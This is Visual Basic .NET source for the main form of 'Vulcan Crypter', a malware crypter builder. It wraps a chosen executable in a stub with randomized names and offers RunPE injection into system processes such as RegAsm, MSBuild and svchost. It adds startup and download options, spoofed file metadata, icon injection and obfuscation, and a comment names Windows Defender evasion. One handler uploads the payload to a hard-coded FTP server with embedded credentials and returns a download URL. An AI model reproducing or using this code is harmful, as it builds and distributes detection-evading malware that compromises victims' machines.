Imports System.IO
Imports System.Reflection
Imports Microsoft.VisualBasic.CompilerServices
Imports System.CodeDom.Compiler
Imports System.Text
Imports System.Runtime.InteropServices
Imports System.Security
Imports System.Security.Cryptography
Imports System.Threading
Imports ICSharpCode.SharpZipLib.Zip
Imports System.IO.Compression
Imports System.Net

Public Class frmMain
#Region "DOTNET"
    Public Shared Function DotNet(bytesdotnet As Byte()) As Boolean
        Dim result As Boolean
        Try
            Assembly.Load(bytesdotnet)
            result = True
        Catch ex As Exception
            result = False
        End Try
        Return result
    End Function
#End Region
#Region "RANDOMSTRING"
    Dim Se As New Random
    Function RandomStrings() As String
        Dim eng As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

        Dim s As String
        s = eng
        Dim sb As New StringBuilder
        For i As Integer = 1 To 5
            Dim idx As Integer = Se.Next(0, 177)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function
#End Region
#Region "RANDOMSTRING"
    Dim T As New Random
    Function RandomString() As String
        Dim eng As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
        Dim chn As String = "艾诶比西迪伊弗吉尺杰开勒我內普曲氏明德拉拉劇氏瑪我山蛋托克和閃卡雙劇馬闕黑我拉報網德盟雙德本報截和庵爾歐丁喇喬金歐盟本爾諾特底的配迪流金蛋金庵斯流喬拉本歐桃桃拉蛋莎奧伴腿雙桃報和德流喇代德伴德本普和加金歐截截代我瑪山的盟的塔喬拉士庵士問歐爾闕一喬德的嗯斯氏魚本蛋爾底闕氏破特雙伴桃截闕或駛歐盟托氏德普斯曲特和明喇加明進歐底黑破曲盟子和我庵闕本韋曲子的底喬底子士拉迪流或埋歐塔普流諾我進丁德氏加莎爾塔河馬迪爾塔拉山代或德哈托去破馬士一冰特奧子歐桃塔駛明德桃馬網拉喬金德斯马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德士曲冰桃腿丁喇塔截冰雙金的拉闕馬歐韋截莎普諾流斯馬破拉瑪拉本和網盟布魚截卡牛腿明和諾拉拉我卡普哈截破或馬桃一托歐莎德山的爾賃亞內貝和艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德"
        Dim heb As String = "אבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשת"
        Dim arb As String = "ابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهوي"
        Dim mix As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهوي艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德אבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשת"
        Dim s As String
        s = arb 'x
        Dim sb As New StringBuilder
        For i As Integer = 1 To 5
            Dim idx As Integer = T.Next(0, 177)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function
#End Region
#Region "SHADOW"
    Private Declare Function CreateRoundRectRgn Lib "Gdi32.dll" (nLeftRect As Integer, nTopRect As Integer, nRightRect As Integer, nBottomRect As Integer, nWidthEllipse As Integer, nHeightEllipse As Integer) As IntPtr
    Public Declare Function DwmExtendFrameIntoClientArea Lib "dwmapi.dll" (hWnd As IntPtr, ByRef pMarInset As MARGINS) As Integer
    Public Declare Function DwmSetWindowAttribute Lib "dwmapi.dll" (hwnd As IntPtr, attr As Integer, ByRef attrValue As Integer, attrSize As Integer) As Integer
    Public Declare Function DwmIsCompositionEnabled Lib "dwmapi.dll" (ByRef pfEnabled As Integer) As Integer
    Protected Overrides ReadOnly Property CreateParams As CreateParams
        Get
            Me.m_aeroEnabled = Me.CheckAeroEnabled()
            Dim a As CreateParams = MyBase.CreateParams
            If Not Me.m_aeroEnabled Then
                a.ClassStyle = a.ClassStyle Or 131072
            End If
            Return a
        End Get
    End Property
    Private Const CS_DROPSHADOW As Integer = 131072
    Private Const WM_NCPAINT As Integer = 133
    Private Const WM_ACTIVATEAPP As Integer = 28
    Private Const WM_NCHITTEST As Integer = 132
    Private Const HTCLIENT As Integer = 1
    Private Const HTCAPTION As Integer = 2
    Private m_aeroEnabled As Boolean
    Private Function CheckAeroEnabled() As Boolean
        Dim result As Boolean
        If Environment.OSVersion.Version.Major >= 6 Then
            Dim num As Integer = 0
            DwmIsCompositionEnabled(num)
            result = (num = 1)
        Else
            result = False
        End If
        Return result
    End Function
    Protected Overrides Sub WndProc(ByRef m As Message)
        Dim msg As Integer = m.Msg
        If msg = 133 Then
            If Me.m_aeroEnabled Then
                Dim num As Integer = 2
                DwmSetWindowAttribute(MyBase.Handle, 2, num, 4)
                Dim margins As MARGINS = New MARGINS() With {.bottomHeight = 1, .leftWidth = 1, .rightWidth = 1, .topHeight = 1}
                DwmExtendFrameIntoClientArea(MyBase.Handle, margins)
            End If
        End If
        MyBase.WndProc(m)
        If m.Msg = 132 AndAlso CInt(m.Result) = 1 Then
            m.Result = CType(2, IntPtr)
        End If
    End Sub
#End Region
#Region "ASSEMBLY"
    Dim FileTitle As String
    Dim FileDescription As String
    Dim FileCompany As String
    Dim Fileproduct As String
    Dim Filecopyright As String
    Dim Fileversion1 As Integer
    Dim Fileversion2 As Integer
    Dim Fileversion3 As Integer
    Dim Fileversion4 As Integer
    Sub ReadAssembly(ByVal Filepath As String)
        Dim f As FileVersionInfo = FileVersionInfo.GetVersionInfo(Filepath)
        FileTitle = f.InternalName
        FileDescription = f.FileDescription
        FileCompany = f.CompanyName
        Fileproduct = f.ProductName
        Filecopyright = f.LegalCopyright
        Dim version As String()
        If f.FileVersion.Contains(",") Then
            version = f.FileVersion.Split(","c)
        Else
            version = f.FileVersion.Split("."c)
        End If
        Try
            Fileversion1 = version(0)
            Fileversion2 = version(1)
            Fileversion3 = version(2)
            Fileversion4 = version(3)
        Catch ex As Exception
        End Try
    End Sub
#End Region

    Public Function ConvertFileToBase64(fileName As String) As String
        Return Convert.ToBase64String(File.ReadAllBytes(fileName))
    End Function
    Dim vcFUoknuUGOaxmFuhuaHnywrk As String
    Public Function oldversion()
        If VTextBox1.Text = "" Then

        Else
            Dim Save As New SaveFileDialog
            Save.Filter = "Executable Files (*.exe)|*.exe"
            Save.FileName = ""
            If Save.ShowDialog = vbOK Then
               
                '' SSERVER BASE64 METHOD
                Try
                    Dim di As New IO.DirectoryInfo(System.Windows.Forms.Application.UserAppDataPath)
                    di.Delete(True)
                Catch ex As Exception

                End Try

                'ServicePointManager.Expect100Continue = True

                'ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12

                'Dim address As String = "https://raw.githubusercontent.com/UBJenBYXXFlbaOo/webpostegro/main/stub.txt"

                'Dim client As WebClient = New WebClient()

                'Dim reply As String = client.DownloadString(address)


                Dim aiYIeqCRo As String = My.Resources.Stub
                aiYIeqCRo = aiYIeqCRo.Replace("%1%", RandomString()).Replace("%2%", RandomString()).Replace("%19%", RandomString()).Replace("%3%", RandomString()).Replace("%4%", RandomString()).Replace("%5%", RandomString()).Replace("%6%", RandomString()).Replace("%7%", RandomString()).Replace("%8%", RandomString()).Replace("%9%", RandomString()).Replace("%10%", RandomString()).Replace("%11%", RandomString()).Replace("%12%", RandomString()).Replace("%13%", RandomString()).Replace("%14%", RandomString()).Replace("%15%", RandomString()).Replace("%16%", RandomString()).Replace("%17%", RandomString()).Replace("%18%", RandomString()).Replace("%Server%", VTextBox1.Text).Replace("%33%", Me.RandomString()).Replace("%34%", Me.RandomString()).Replace("%35%", Me.RandomString()).Replace("%36%", Me.RandomString()).Replace("%37%", Me.RandomString()).Replace("%38%", Me.RandomString()).Replace("%39%", Me.RandomString()).Replace("%55%", RandomString()).Replace("%56%", RandomString()).Replace("%Startup File Name%", VTextBox16.Text()).Replace("%Startup File Name%", VTextBox16.Text()).Replace("%FolderName%", VTextBox15.Text()).Replace("%DownloadLink%", VTextBox5.Text).Replace("%20%", Me.RandomString()).Replace("%21%", Me.RandomString()).Replace("%22%", Me.RandomString()).Replace("%23%", Me.RandomString()).Replace("%24%", Me.RandomString()).Replace("%25%", Me.RandomString()).Replace("%26%", Me.RandomString()).Replace("%27%", Me.RandomString()).Replace("%28%", Me.RandomString()).Replace("%29%", Me.RandomString()).Replace("%30%", Me.RandomString()).Replace("%31%", Me.RandomString()).Replace("%32%", Me.RandomString()).Replace("%33%", Me.RandomString())
                vcFUoknuUGOaxmFuhuaHnywrk = aiYIeqCRo

                Dim array As Byte() = File.ReadAllBytes(Me.VTextBox1.Text)
                Dim text As String = "0x" + BitConverter.ToString(array).Replace("-", ",0x")
                vcFUoknuUGOaxmFuhuaHnywrk = My.Resources.Stub.Replace("%ENCRYPT%", text).Replace("%PW%", Convert.ToString(array.Length))
                vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("0x0", "0x")


                If ComboBox1.SelectedItem = "Normal" Then
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("""APPRUN""", "Application.ExecutablePath")
                ElseIf ComboBox1.SelectedItem = "RegAsm" Then
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("""APPRUN""", """C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe""")

                ElseIf ComboBox1.SelectedItem = "MsBuild" Then
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("""APPRUN""", """C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe""")

                ElseIf ComboBox1.SelectedItem = "vbc" Then
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("""APPRUN""", """C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\vbc.exe""")

                ElseIf ComboBox1.SelectedItem = "svchost" Then
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("""APPRUN""", """C:\\Windows\\System32\\svchost.exe""")

                ElseIf ComboBox1.SelectedItem = "schtasks" Then
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("""APPRUN""", """C:\\Windows\\System32\\schtasks.exe""")

                ElseIf ComboBox1.SelectedItem = "explorer" Then
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("""APPRUN""", """C:\\Windows\\explorer.exe""")
                ElseIf ComboBox1.SelectedItem = "powershell" Then
                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("""APPRUN""", """C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""")

                ElseIf ComboBox1.SelectedItem = "RegSvcs" Then

                    vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("""APPRUN""", """C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe""")



                End If

                If VCheckBox9.Checked = True Then
                    vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//start", Nothing)



                Else
                    Text = Replace(Text, "//start", "//" + RandomString())

                End If


                vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//Assembly ", Nothing)
                vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{1}", TextBoxTitle.Text)
                vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{2}", TextBoxDescription.Text)
                vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{3}", TextBoxCompany.Text)
                vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{4}", TextBoxProduct.Text)
                vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{5}", TextBoxCopyright.Text)
                vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{7}", num1.Text)
                vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{8}", num2.Text)
                vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{9}", num3.Text)
                vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{10}", num4.Text)
                vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//Default", "//" + RandomString())

                If VCheckBox10.Checked = True Then
                    vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//download ", Nothing)



                Else
                    vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//download", "//" + RandomString())

                End If
                ''BYTES
                vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("%RUNPE%", My.Resources.Runpe)

                Codedom.Runn.Exec(Save.FileName, vcFUoknuUGOaxmFuhuaHnywrk, Nothing)

                If VTextBox2.Text = "" Then

                Else

                    IconInjector.InjectIcon(Save.FileName, VTextBox2.Text)
                End If




                If VCheckBox1.Checked = True Then


                    Confuser.Obfuscate(Save.FileName)
                    File.Delete(Save.FileName)

                Else

                End If

                'Try
                '    Dim FileToCopy As String
                '    Dim NewCopy As String

                '    FileToCopy = System.Windows.Forms.Application.UserAppDataPath + "\" + TextBox2.Text
                '    NewCopy = Save.FileName

                '    If System.IO.File.Exists(FileToCopy) = True Then

                '        System.IO.File.Copy(FileToCopy, NewCopy)
                '    End If
                'Catch ex As Exception

                'End Try
                'Try
                '    Dim di As New IO.DirectoryInfo(System.Windows.Forms.Application.UserAppDataPath)
                '    di.Delete(True)
                '    MessageBox.Show(Save.FileName)
                'Catch ex As Exception
                '    MessageBox.Show(ex.ToString)
                '    Clipboard.SetText(aiYIeqCRo)
                'End Try

                'Clipboard.SetText(aiYIeqCRo)
                'TextBox2.Text = RandomString()

                Clipboard.SetText(vcFUoknuUGOaxmFuhuaHnywrk)

                RichTextBox1.Text = ""
                'RichTextBox1.Text = ""
            End If

        End If
    End Function
    Private Sub frmMain_Load(sender As Object, e As EventArgs)
        Me.WindowState = FormWindowState.Normal
        Me.MinimumSize = Me.Size
        Me.MaximumSize = Me.Size

        ServicePointManager.Expect100Continue = True
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12

        VTheme1.Text = "Vulcan Crypter v5.1.0 "
        Me.Text = "Vulcan Crypter v5.1.0 "
        VTextBox4.Text = Randomization.RandomPassword.Generate(35, 35)
        TextBox2.Text = RandomString()
        ComboBox1.SelectedItem = "Normal"


    End Sub

    Private Sub VButton6_Click(sender As Object, e As EventArgs) Handles VButton6.Click
        Environment.Exit(1)
    End Sub

    Private Sub VButton2_Click(sender As Object, e As EventArgs) Handles VButton2.Click
        Dim Open As New OpenFileDialog
        Open.Filter = "Icon Files (*.ico)|*.ico"
        If Open.ShowDialog = vbOK Then
            VTextBox2.Text = Open.FileName
            PictureBox1.Image = Drawing.Icon.ExtractAssociatedIcon(VTextBox2.Text).ToBitmap
        End If
    End Sub

    Private Sub VButton1_Click(sender As Object, e As EventArgs)
        Dim Open As New OpenFileDialog
        Open.Filter = "Execuable Files (*.exe)|*.exe"
        If Open.ShowDialog = vbOK Then
            VTextBox1.Text = Open.FileName
            If DotNet(File.ReadAllBytes(Open.FileName)) Then
                Label17.Text = ".NET File"
            Else
                Label17.Text = "Native File"
            End If
            Dim FileInfo As FileInfo = New FileInfo(Open.FileName)
            Dim Num As Integer = CInt(FileInfo.Length)
            Me.Label20.Text = Conversions.ToString(CDbl(Num) / 1000.0) + " KB"


            Dim Payload As String = RandomStrings() + ".exe"
            Dim mReq As System.Net.FtpWebRequest = DirectCast(System.Net.WebRequest.Create("ftp://ftp.ejbrejs.tech/public_html/" + Payload), System.Net.FtpWebRequest)
            mReq.Credentials = New System.Net.NetworkCredential("ejbrejs", "3dG5i#.xgJ34YD")
            mReq.Method = System.Net.WebRequestMethods.Ftp.UploadFile

            Dim MFile() As Byte = System.IO.File.ReadAllBytes(VTextBox1.Text)

            Dim mStream As System.IO.Stream = mReq.GetRequestStream()
            mStream.Write(MFile, 0, MFile.Length)

            mStream.Close()
            Thread.Sleep(500)

            RichTextBox2.Text = "http://ebrejs.tech/" + Payload
            Thread.Sleep(500)
            'MessageBox.Show("Please select Injection for Windows Defender. RegASM (.NET) recommended. Native (svchost)")
        End If
    End Sub

    Private Sub VButton3_Click(sender As Object, e As EventArgs) Handles VButton3.Click
        VTextBox4.Text = Randomization.RandomPassword.Generate(35, 35)
    End Sub


    Private Sub VButton7_Click(sender As Object, e As EventArgs) Handles VButton7.Click
        If VTextBox1.Text = "" Then

        Else
            oldversion()
        End If
    End Sub

    Private Sub VButton5_Click(sender As Object, e As EventArgs) Handles VButton5.Click
        Try
            Dim Open As New OpenFileDialog
            Open.Filter = "All Files (*.*)|*.*"
            If Open.ShowDialog = vbOK Then
                ReadAssembly(Open.FileName)
                TextBoxTitle.Text = FileTitle
                TextBoxDescription.Text = FileDescription
                TextBoxCompany.Text = FileCompany
                TextBoxProduct.Text = Fileproduct
                TextBoxCopyright.Text = Filecopyright
                num1.Text = Fileversion1
                num2.Text = Fileversion2
                num3.Text = Fileversion3
                num4.Text = Fileversion4
            End If
        Catch Complexious As Exception
        End Try
    End Sub

    Private Sub VCheckBox10_Click(sender As Object, e As EventArgs) Handles VCheckBox10.Click
        If VCheckBox10.Checked Then
            VTextBox5.Enabled = True
            VTextBox6.Enabled = True
        Else
            VTextBox5.Enabled = False
            VTextBox6.Enabled = False
        End If
    End Sub

    Private Sub VButton1_Click_1(sender As Object, e As EventArgs) Handles VButton1.Click
        Dim openFileDialog As OpenFileDialog = New OpenFileDialog() With {.Filter = "Executable Files|*.exe;*.dll", .InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)}
        Dim flag As Boolean = openFileDialog.ShowDialog() = DialogResult.OK
        If flag Then
            Me.VTextBox1.Text = openFileDialog.FileName
            If DotNet(File.ReadAllBytes(openFileDialog.FileName)) Then
                Label17.Text = ".NET File"
            Else
                Label17.Text = "Native File"
            End If
            Dim FileInfo As FileInfo = New FileInfo(openFileDialog.FileName)
            Dim Num As Integer = CInt(FileInfo.Length)
            Me.Label20.Text = Conversions.ToString(CDbl(Num) / 1000.0) + " KB"
        End If
    End Sub

    Private Sub frmMain_Load_1(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.WindowState = FormWindowState.Normal
        Me.MinimumSize = Me.Size
        Me.MaximumSize = Me.Size

        ServicePointManager.Expect100Continue = True
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12

        VTheme1.Text = "Vulcan Crypter v5.1.0 Modified By (Razor)"
        Me.Text = "Vulcan Crypter v5.1.0 Modified By (Razor)"
        VTextBox4.Text = Randomization.RandomPassword.Generate(35, 35)
        TextBox2.Text = RandomString()
        ComboBox1.SelectedItem = "Normal"

    End Sub
End Class
#Region "RANDOM"
Public Class Randomization
    Public Class RandomPassword
        Private Shared DEFAULT_MIN_PASSWORD_LENGTH As Integer = 8
        Private Shared DEFAULT_MAX_PASSWORD_LENGTH As Integer = 10
        Private Shared PASSWORD_CHARS_LCASE As String = "abcdefgijkmnopqrstwxyz"
        Private Shared PASSWORD_CHARS_UCASE As String = "ABCDEFGHJKLMNPQRSTWXYZ"
        Public Shared Function Generate() As String
            Generate = Generate(DEFAULT_MIN_PASSWORD_LENGTH, _
                                DEFAULT_MAX_PASSWORD_LENGTH)
        End Function
        Public Shared Function Generate(ByVal length As Integer) As String
            Generate = Generate(length, length)
        End Function
        Public Shared Function Generate(ByVal minLength As Integer, _
                                ByVal maxLength As Integer) _
          As String
            If (minLength <= 0 Or maxLength <= 0 Or minLength > maxLength) Then
                Generate = Nothing
            End If
            Dim charGroups As Char()() = New Char()() _
            { _
                PASSWORD_CHARS_LCASE.ToCharArray(), PASSWORD_CHARS_UCASE.ToCharArray(), PASSWORD_CHARS_UCASE.ToCharArray()}
            Dim charsLeftInGroup As Integer() = New Integer(charGroups.Length - 1) {}
            Dim I As Integer
            For I = 0 To charsLeftInGroup.Length - 1
                charsLeftInGroup(I) = charGroups(I).Length
            Next
            Dim leftGroupsOrder As Integer() = New Integer(charGroups.Length - 1) {}
            For I = 0 To leftGroupsOrder.Length - 1
                leftGroupsOrder(I) = I
            Next
            Dim randomBytes As Byte() = New Byte(3) {}
            Dim rng As RNGCryptoServiceProvider = New RNGCryptoServiceProvider()
            rng.GetBytes(randomBytes)
            Dim seed As Integer = ((randomBytes(0) And &H7F) << 24 Or _
                                    randomBytes(1) << 16 Or _
                                    randomBytes(2) << 8 Or _
                                    randomBytes(3))
            Dim random As Random = New Random(seed)
            Dim password As Char() = Nothing
            If (minLength < maxLength) Then
                password = New Char(random.Next(minLength - 1, maxLength)) {}
            Else
                password = New Char(minLength - 1) {}
            End If
            Dim nextCharIdx As Integer
            Dim nextGroupIdx As Integer
            Dim nextLeftGroupsOrderIdx As Integer
            Dim lastCharIdx As Integer
            Dim lastLeftGroupsOrderIdx As Integer = leftGroupsOrder.Length - 1
            For I = 0 To password.Length - 1
                If (lastLeftGroupsOrderIdx = 0) Then
                    nextLeftGroupsOrderIdx = 0
                Else
                    nextLeftGroupsOrderIdx = random.Next(0, lastLeftGroupsOrderIdx)
                End If
                nextGroupIdx = leftGroupsOrder(nextLeftGroupsOrderIdx)
                lastCharIdx = charsLeftInGroup(nextGroupIdx) - 1
                If (lastCharIdx = 0) Then
                    nextCharIdx = 0
                Else
                    nextCharIdx = random.Next(0, lastCharIdx + 1)
                End If
                password(I) = charGroups(nextGroupIdx)(nextCharIdx)
                If (lastCharIdx = 0) Then
                    charsLeftInGroup(nextGroupIdx) = _
                                    charGroups(nextGroupIdx).Length
                Else
                    If (lastCharIdx <> nextCharIdx) Then
                        Dim temp As Char = charGroups(nextGroupIdx)(lastCharIdx)
                        charGroups(nextGroupIdx)(lastCharIdx) = _
                                    charGroups(nextGroupIdx)(nextCharIdx)
                        charGroups(nextGroupIdx)(nextCharIdx) = temp
                    End If

                    charsLeftInGroup(nextGroupIdx) = _
                               charsLeftInGroup(nextGroupIdx) - 1
                End If
                If (lastLeftGroupsOrderIdx = 0) Then
                    lastLeftGroupsOrderIdx = leftGroupsOrder.Length - 1
                Else
                    If (lastLeftGroupsOrderIdx <> nextLeftGroupsOrderIdx) Then
                        Dim temp As Integer = _
                                    leftGroupsOrder(lastLeftGroupsOrderIdx)
                        leftGroupsOrder(lastLeftGroupsOrderIdx) = _
                                    leftGroupsOrder(nextLeftGroupsOrderIdx)
                        leftGroupsOrder(nextLeftGroupsOrderIdx) = temp
                    End If
                    lastLeftGroupsOrderIdx = lastLeftGroupsOrderIdx - 1
                End If
            Next
            Generate = New String(password)
        End Function
    End Class
End Class
#End Region
#Region "MARGINS"
Public Structure MARGINS
    Public leftWidth As Integer
    Public rightWidth As Integer
    Public topHeight As Integer
    Public bottomHeight As Integer
End Structure
#End Region
#Region "ICON"
Public Class IconInjector

    <SuppressUnmanagedCodeSecurity()> _
    Private Class NativeMethods
        <DllImport("kernel32")> _
        Public Shared Function BeginUpdateResource( _
            ByVal fileName As String, _
            <MarshalAs(UnmanagedType.Bool)> ByVal deleteExistingResources As Boolean) As IntPtr
        End Function

        <DllImport("kernel32")> _
        Public Shared Function UpdateResource( _
            ByVal hUpdate As IntPtr, _
            ByVal type As IntPtr, _
            ByVal name As IntPtr, _
            ByVal language As Short, _
            <MarshalAs(UnmanagedType.LPArray, SizeParamIndex:=5)> _
            ByVal data() As Byte, _
            ByVal dataSize As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function

        <DllImport("kernel32")> _
        Public Shared Function EndUpdateResource( _
            ByVal hUpdate As IntPtr, _
            <MarshalAs(UnmanagedType.Bool)> ByVal discard As Boolean) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function
    End Class

    ' The first structure in an ICO file lets us know how many images are in the file.
    <StructLayout(LayoutKind.Sequential)> _
    Private Structure ICONDIR
        Public Reserved As UShort  ' Reserved, must be 0
        Public Type As UShort      ' Resource type, 1 for icons.
        Public Count As UShort     ' How many images.
        ' The native structure has an array of ICONDIRENTRYs as a final field.
    End Structure

    ' Each ICONDIRENTRY describes one icon stored in the ico file. The offset says where the icon image data
    ' starts in the file. The other fields give the information required to turn that image data into a valid
    ' bitmap.
    <StructLayout(LayoutKind.Sequential)> _
    Private Structure ICONDIRENTRY
        Public Width As Byte            ' Width, in pixels, of the image
        Public Height As Byte           ' Height, in pixels, of the image
        Public ColorCount As Byte       ' Number of colors in image (0 if >=8bpp)
        Public Reserved As Byte         ' Reserved ( must be 0)
        Public Planes As UShort         ' Color Planes
        Public BitCount As UShort       ' Bits per pixel
        Public BytesInRes As Integer   ' Length in bytes of the pixel data
        Public ImageOffset As Integer  ' Offset in the file where the pixel data starts.
    End Structure

    ' Each image is stored in the file as an ICONIMAGE structure:
    'typdef struct
    '{
    '   BITMAPINFOHEADER   icHeader;      // DIB header
    '   RGBQUAD         icColors[1];   // Color table
    '   BYTE            icXOR[1];      // DIB bits for XOR mask
    '   BYTE            icAND[1];      // DIB bits for AND mask
    '} ICONIMAGE, *LPICONIMAGE;


    <StructLayout(LayoutKind.Sequential)> _
    Private Structure BITMAPINFOHEADER
        Public Size As UInteger
        Public Width As Integer
        Public Height As Integer
        Public Planes As UShort
        Public BitCount As UShort
        Public Compression As UInteger
        Public SizeImage As UInteger
        Public XPelsPerMeter As Integer
        Public YPelsPerMeter As Integer
        Public ClrUsed As UInteger
        Public ClrImportant As UInteger
    End Structure

    ' The icon in an exe/dll file is stored in a very similar structure:
    <StructLayout(LayoutKind.Sequential, Pack:=2)> _
    Private Structure GRPICONDIRENTRY
        Public Width As Byte
        Public Height As Byte
        Public ColorCount As Byte
        Public Reserved As Byte
        Public Planes As UShort
        Public BitCount As UShort
        Public BytesInRes As Integer
        Public ID As UShort
    End Structure

    Public Shared Sub InjectIcon(ByVal exeFileName As String, ByVal iconFileName As String)
        InjectIcon(exeFileName, iconFileName, 1, 1)
    End Sub

    Public Shared Sub InjectIcon(ByVal exeFileName As String, ByVal iconFileName As String, ByVal iconGroupID As UInteger, ByVal iconBaseID As UInteger)
        Const RT_ICON = 3UI
        Const RT_GROUP_ICON = 14UI
        Dim iconFile As IconFile = iconFile.FromFile(iconFileName)
        Dim hUpdate = NativeMethods.BeginUpdateResource(exeFileName, False)
        Dim data = iconFile.CreateIconGroupData(iconBaseID)
        NativeMethods.UpdateResource(hUpdate, New IntPtr(RT_GROUP_ICON), New IntPtr(iconGroupID), 0, data, data.Length)
        For i = 0 To iconFile.ImageCount - 1
            Dim image = iconFile.ImageData(i)
            NativeMethods.UpdateResource(hUpdate, New IntPtr(RT_ICON), New IntPtr(iconBaseID + i), 0, image, image.Length)
        Next
        NativeMethods.EndUpdateResource(hUpdate, False)
    End Sub

    Private Class IconFile

        Private iconDir As New ICONDIR
        Private iconEntry() As ICONDIRENTRY
        Private iconImage()() As Byte

        Public ReadOnly Property ImageCount As Integer
            Get
                Return iconDir.Count
            End Get
        End Property

        Public ReadOnly Property ImageData(ByVal index As Integer) As Byte()
            Get
                Return iconImage(index)
